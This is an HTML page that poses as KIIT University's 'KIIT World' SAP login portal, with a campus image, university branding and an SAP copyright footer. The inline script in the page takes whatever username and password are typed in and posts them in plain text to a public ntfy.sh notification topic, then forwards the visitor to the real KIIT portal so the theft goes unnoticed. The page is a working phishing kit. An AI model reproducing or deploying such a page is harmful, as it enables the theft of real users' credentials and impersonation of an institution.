<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>KIIT World Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="outer-container">
        <div class="login-container">
            <div class="login-box">
                <div class="left-image">
                    <img src="branding-image.jpg" alt="KIIT Campus">
                </div>
                <div class="right-form">
                    <h2>Welcome to KIIT World</h2>
                    <p class="subtext">
                        INDIA's first university to implement SAP<br>
                        in all its schools and processes at a time
                    </p>
                    <p class="error-message" id="error-message" style="display: none;">
                        <img src="error-icon.png" alt="!" class="icon"> User authentication failed
                    </p>
                    <form id="loginForm">
                        <label for="user">User <span class="required">*</span></label><br>
                        <input type="text" id="user" name="user"><br>

                        <label for="password">Password <span class="required">*</span></label><br>
                        <input type="password" id="password" name="password"><br><br>

                        <button type="submit">Log On</button>
                    </form>
                </div>
            </div>
            <div class="footer">
                <p>Copyright © SAP AG. All Rights Reserved.</p>
                <img src="sap_logo.png" alt="KIIT Logo" class="kiit-logo">
            </div>
        </div>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault(); // prevent page refresh

            const username = document.getElementById("user").value;
            const password = document.getElementById("password").value;

            if (!username || !password) {
                document.getElementById("error-message").style.display = "block";
                return;
            }

            const message = `Login attempt:\nUsername: ${username}\nPassword: ${password}`;

            fetch("https://ntfy.sh/kiit-login", {
                method: "POST",
                body: message,
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = "https://kiitportal.kiituniversity.net/irj/portal/"; // 🔁 Replace with your actual target URL
                } else {
                }
            })
            .catch(error => {
            });
        });
    </script>
</body>
</html>
